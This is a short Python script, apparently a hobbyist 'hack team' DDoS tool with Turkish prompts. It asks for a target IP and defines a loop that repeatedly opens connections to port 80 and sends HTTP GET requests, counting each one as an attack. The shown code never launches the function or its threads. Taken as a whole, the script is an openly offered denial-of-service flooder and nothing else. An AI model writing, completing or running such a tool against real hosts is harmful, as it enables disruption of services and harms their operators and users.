import socket
import threading
import os
os.system("clear")
banner="""
###############################
#Akrep Hack Tim DDoS          #
#Code By Bunny Sayne          #
###############################
"""
print (banner)
target = input("hedef ip: ")
port = 80

attack_num = 0
def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))

        global attack_num
        attack_num += 1
        print("Saldiri Basladi!")
        print(attack_num)

        s.close()
